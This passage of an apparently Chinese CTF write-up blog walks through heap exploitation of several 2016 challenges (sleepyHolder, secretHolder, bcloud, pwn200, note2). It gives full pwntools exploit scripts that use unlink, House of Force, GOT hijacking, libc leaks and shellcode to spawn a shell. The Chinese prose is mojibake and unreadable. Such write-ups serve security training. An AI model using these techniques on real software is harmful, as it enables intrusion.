class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">fd = bag+<span class="number">0x10</span><span class="number">-0x18</span></span><br><span class="line">bk = bag+<span class="number">0x10</span><span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x80</span>,fd,bk).ljust(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += flat(<span class="number">0x80</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bag[2] &lt;-&gt; bag[-1]</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,elf.got[<span class="string">&#x27;free&#x27;</span>],elf.got[<span class="string">&#x27;fflush&#x27;</span>],elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># puts(GOT[fflush])</span></span><br><span class="line">ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">fflush = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;fflush&#x27;</span>,fflush)</span><br><span class="line">system,binsh = ret2libc(fflush,<span class="string">&#x27;fflush&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="sleepyHolder-hitcon-2016"><a href="#sleepyHolder-hitcon-2016" class="headerlink" title="sleepyHolder_hitcon_2016"></a>sleepyHolder_hitcon_2016</h2><p>è¿™é“é¢˜å…è®¸ä¿å­˜small/big/huge secretï¼Œå…¶ä¸­hugeåªèƒ½ä¿å­˜ä¸€æ¬¡ï¼Œä¸èƒ½åˆ é™¤å’Œä¿®æ”¹ï¼Œå¹¶ä¸”åœ¨ä¿å­˜äº†ä¸€ä¸ªsmall/bigä¹‹åå°±ä¸èƒ½å†ä¿å­˜æ–°çš„small/bigäº†ï¼Œåªèƒ½renewã€‚</p>
<p>æ˜¾ç„¶è¿™ä¸ªhugeå°±æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒã€‚å®é™…ä¸Šï¼Œhugeçš„èŒƒå›´å±äºlarge binï¼Œåœ¨ç”³è¯·è¿™ä¹ˆå¤§çš„chunkæ—¶å¦‚æœunsorted binä¸­æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„ï¼Œå°±ä¼šè§¦å‘<code>malloc_consolidate()</code>ï¼Œä½¿fastbinä¸­çš„chunkåˆå¹¶è¿›å…¥unsorted binï¼Œæœ€ç»ˆæ ¹æ®åˆå¹¶åçš„å¤§å°è¿›å…¥small binæˆ–large binã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å…ˆç”³è¯·ä¸€ä¸ªsmallï¼Œç„¶åç”³è¯·bigé˜²æ­¢smallè¢«é‡Šæ”¾æ—¶ä¸top chunkåˆå¹¶ï¼Œå†é‡Šæ”¾smallã€‚æ­¤æ—¶smallè¿›å…¥fastbinï¼Œå†ç”³è¯·hugeå³å¯è®©smallè¿›å…¥åˆ°small binã€‚</p>
<p>ç”±äºè¿™æ—¶smallå·²ç»ä¸å¤„äºfastbiné“¾è¡¨å¤´äº†ï¼Œæ‰€ä»¥å†æ¬¡é‡Šæ”¾å¹¶ä¸ä¼šå‡ºé”™ï¼Œé€ æˆdouble freeã€‚è¿™æ ·ä¹‹ååœ¨smallå†…ä¼ªé€ chunkå¹¶unlinkåŠ«æŒGOTè¡¨å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1-&gt;fastbin</span></span><br><span class="line">add(<span class="number">3</span>) <span class="comment"># consolidate,1-&gt;unsorted bin-&gt;smallbin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">small_secret = <span class="number">0x6020d0</span></span><br><span class="line">fd = small_secret - <span class="number">0x18</span></span><br><span class="line">bk = small_secret - <span class="number">0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?,big,huge,small,big_flag,huge_flag,small_flag</span></span><br><span class="line">payload = flat(<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># free -&gt; puts</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="secretHolder-hitcon-2016"><a href="#secretHolder-hitcon-2016" class="headerlink" title="secretHolder_hitcon_2016"></a>secretHolder_hitcon_2016</h2><p>ç±»ä¼¼ä¸Šä¸€é¢˜ï¼Œä¸è¿‡hugeå¯ä»¥ä¿®æ”¹å’Œåˆ é™¤äº†ã€‚ç”±äºhugeéå¸¸å¤§ï¼Œåˆ†é…æ—¶ä¼šè°ƒç”¨<code>mmap()</code>ï¼Œä½†æ˜¯å½“é‡Šæ”¾æ‰hugeå†ç”³è¯·æ—¶ï¼Œ<code>mmap_threshold</code>å·²ç»å˜å¾—å’Œhugeä¸€æ ·å¤§ï¼Œæ­¤æ—¶åˆ†é…hugeä½¿ç”¨çš„æ˜¯<code>brk()</code>ï¼Œå› æ­¤hugeè¢«åˆ†é…åˆ°äº†å †ä¸Šã€‚</p>
<p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä»¤smallå’Œhugeåœ°å€é‡åˆï¼Œéšååœ¨ä¸‹é¢å«ä¸Šbigã€‚åœ¨smallé‡Œä¼ªé€ å †å—å¹¶é‡Šæ”¾bigï¼Œè§¦å‘unlinkï¼Œå‰©ä½™çš„å·¥ä½œå°±å’Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">	sa(<span class="string">&#x27;: \n&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">	sa(<span class="string">&#x27;: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># mmap threshold +++</span></span><br><span class="line">add(<span class="number">3</span>) <span class="comment"># brk()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># small &lt;-&gt; huge</span></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">small = <span class="number">0x6020b0</span></span><br><span class="line">fd = small<span class="number">-0x18</span></span><br><span class="line">bk = small<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">payload += flat(<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?,big,huge,small,big_flag,huge_flag,small_flag</span></span><br><span class="line">payload = flat(<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># free -&gt; puts</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>åœ¨è¯»å…¥åå­—å’Œè¯»å…¥Orgä»¥åŠHostæ—¶ï¼Œå‡å­˜åœ¨åŒæ ·çš„<code>strcpy</code>æ¼æ´ï¼Œå‰è€…å¯¼è‡´æ³„éœ²å †åœ°å€ï¼Œè€Œåè€…å…è®¸æˆ‘ä»¬off-by-oneä¿®æ”¹top chunkçš„å¤§å°ï¼Œä»è€Œå®ç°House of Forceã€‚é€šè¿‡gdbè°ƒè¯•å¾—åˆ°<code>top_chunk = heap + 0xd0</code>ï¼Œé‚£ä¹ˆæ„é€ çš„<code>evil_size</code>å°±æ˜¯æˆ‘ä»¬æƒ³åˆ†é…åˆ°çš„<code>note_len</code>æ•°ç»„åœ°å€å‡å»headerçš„0x8ï¼Œå‡å»<code>old_top_chunk</code>åœ°å€ï¼Œå†å‡å»12ï¼Œè¿™æ˜¯å› ä¸ºå·²ç»åˆ†é…äº†ä¸‰ä¸ªå †å—ï¼Œåœ¨ç¨‹åºä¸­æ¯ä¸ªå †å—é¢å¤–åˆ†é…äº†4Bã€‚æœ€åä»<code>note_len</code>è¦†ç›–åˆ°<code>note</code>æ•°ç»„ï¼ŒåŠ«æŒ<code>free</code>åˆ°<code>printf</code>æ³„éœ²libcï¼Œå†åŠ«æŒ<code>atoi</code>åˆ°<code>system</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:\n&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap = uu32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">sla(<span class="string">&#x27;Host:\n&#x27;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">note_len = <span class="number">0x804b0a0</span></span><br><span class="line">note = <span class="number">0x804b120</span></span><br><span class="line">top_chunk = heap + <span class="number">0xd0</span></span><br><span class="line">evil_size = note_len<span class="number">-0x8</span>-top_chunk<span class="number">-0xc</span> <span class="comment"># gdb</span></span><br><span class="line">add(evil_size,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">payload = flat((note-note_len)*<span class="string">&#x27;a&#x27;</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>],elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># printf(atoi.got)</span></span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p32(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h2><p>é¦–å…ˆä¸éš¾å‘ç°è¯»å…¥<code>name</code>æ—¶å­˜åœ¨off-by-oneï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²æ ˆåœ°å€ã€‚ä¸ºäº†åé¢ret2shellcodeï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨<code>name</code>é‡Œé¡ºä¾¿å†™å¥½shellcodeï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;u?\n&#x27;</span>,payload)</span><br><span class="line">ru(payload)</span><br><span class="line">rbp = uu64(ru(<span class="string">&#x27;, w&#x27;</span>,<span class="literal">True</span>))</span><br><span class="line">leak(<span class="string">&#x27;rbp&#x27;</span>,rbp)</span><br></pre></td></tr></table></figure>

<p>è€Œè¯»å…¥<code>money</code>æ—¶ï¼Œæ°å¥½å¯ä»¥è¦†ç›–åˆ°å †æŒ‡é’ˆ<code>dest</code>ã€‚é‚£ä¹ˆå¯ä»¥è¦†ç›–<code>dest</code>ä¸ºæˆ‘ä»¬ä¼ªé€ çš„chunkï¼ŒåŒæ—¶å‡†å¤‡å¥½<code>id</code>ï¼ˆåªéœ€è¦å¤§äº0x10å°äº0x21000å³å¯ï¼‰ä½œä¸º<code>nextsize</code>ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆé‡Šæ”¾å†ç”³è¯·è¿™ä¸ªfake chunkï¼Œå°±å¯ä»¥æ§åˆ¶ripäº†ï¼Œæœ€åè¦†ç›–ripä¸ºshellcodeåœ°å€ã€‚</p>
<p>é€šè¿‡gdbè°ƒè¯•ï¼Œå¯ä»¥ç»˜åˆ¶å¤§è‡´çš„æ ˆç»“æ„å›¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> ------------ &lt;- leaked rbp</span><br><span class="line">|            | 0x20</span><br><span class="line"> ------------ &lt;- rbp</span><br><span class="line">| shellcode  | 0x30</span><br><span class="line"> ------------ &lt;- shellcode_addr  --</span><br><span class="line">| 0x20       | id                 |</span><br><span class="line"> ------------                     |</span><br><span class="line">|            |                    |</span><br><span class="line"> ------------                     |</span><br><span class="line">| rip        |                    | 0x40</span><br><span class="line"> ------------                     |</span><br><span class="line">| rbp        |                    |</span><br><span class="line"> ------------                     |</span><br><span class="line">| dest       |                    |</span><br><span class="line"> ------------ &lt;- fake            --</span><br><span class="line">| 0x41       |</span><br><span class="line"> ------------</span><br><span class="line">| prev_size  |</span><br><span class="line"> ------------</span><br><span class="line">| ...        |</span><br></pre></td></tr></table></figure>

<p>ç”±æ­¤å¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc = rbp<span class="number">-0x50</span></span><br><span class="line">fake = rbp<span class="number">-0x90</span></span><br></pre></td></tr></table></figure>

<p>ä»è€Œä¼ªé€ å †å—ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;id ~~?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sa(<span class="string">&#x27;money~\n&#x27;</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+flat(<span class="number">0</span>,<span class="number">0x41</span>,<span class="number">0</span>,fake))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>) <span class="comment"># free</span></span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>) <span class="comment"># malloc</span></span><br><span class="line">sla(<span class="string">&#x27;long?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x30</span>)) <span class="comment"># + 0x10 = 0x40</span></span><br><span class="line">ru(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">sl(flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,sc))</span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h2><p>æ·»åŠ noteæ—¶ï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯¼è‡´æ·»åŠ å¤§å°ä¸º0çš„noteï¼Œå¯ä»¥è¾“å…¥çš„é•¿åº¦ä¸ºæ— ç¬¦å·çš„<code>-1</code>ï¼Œå¯ä»¥è®¤ä¸ºæ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯<code>malloc</code>ä¾æ—§ä¼šåˆ†é…<code>0x20</code>å­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸‰ä¸ªchunkï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">| ...               |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*8             |               |</span><br><span class="line"> ------------------- &lt;- ptr[2]    chunk2</span><br><span class="line">| size&#x3D;0x91         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br><span class="line">|                   |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*8             |               |</span><br><span class="line"> ------------------- &lt;- ptr[1]    chunk1</span><br><span class="line">| size&#x3D;0x20         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br><span class="line">|                   | 0x18          |</span><br><span class="line"> -------------------                |</span><br><span class="line">| bp_prev_size&#x3D;0x60 |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*0x40          | 0x40          |</span><br><span class="line"> -------------------                |</span><br><span class="line">| fd     | bk       | 0x10          |</span><br><span class="line"> -------------------              chunk0</span><br><span class="line">| fake_size&#x3D;0x61    |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| fake_prev_size&#x3D;0  |               |</span><br><span class="line"> ------------------- &lt;- ptr[0]      |</span><br><span class="line">| size&#x3D;0x91         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬åœ¨0x80çš„<code>chunk0</code>å†…ä¼ªé€ äº†0x61çš„chunkï¼Œå¹¶é€šè¿‡<code>bp_prev_size=0x60</code>ç¡®ä¿èƒ½é€šè¿‡æ£€æŸ¥ã€‚éšååˆ†é…å¤§å°ä¸º<code>0</code>çš„<code>chunk1</code>ï¼ˆå®é™…å¤§å°ä¸º0x20ï¼‰ï¼Œç”±äºæ•´æ•°æº¢å‡ºè¿™é‡Œå¯ä»¥è¾“å…¥æ— é™é•¿åº¦çš„å†…å®¹ï¼Œæœ€ååˆ†é…0x80çš„<code>chunk2</code>ç”¨æ¥å¼•èµ·<code>unlink</code>ã€‚</p>
<p>æ¥ä¸‹æ¥é‡Šæ”¾1å†æ‹¿å›æ¥ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ°<code>chunk2</code>ï¼Œä¿®æ”¹å…¶<code>prev_size</code>å’Œ<code>chunk_size</code>ï¼Œå‰è€…ä¿®æ”¹ä¸º<code>0x20+0x80=0xa0</code>ï¼Œåè€…ç½®<code>PREV_IN_USE</code>ä½ä¸º<code>0</code>ã€‚è¿™æ ·å†é‡Šæ”¾2å°±å¯ä»¥<code>unlink</code>æ‰æˆ‘ä»¬çš„fake chunkäº†ã€‚æ­¤æ—¶<code>ptr</code>æŒ‡å‘<code>ptr-0x18</code>ï¼Œå¡«å……0x18å­—èŠ‚åå³å¯ä¿®æ”¹<code>ptr[0]</code>ï¼Œä¹‹åå°±æ˜¯å¸¸è§„GOTåŠ«æŒäº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;128)&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,choice,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span 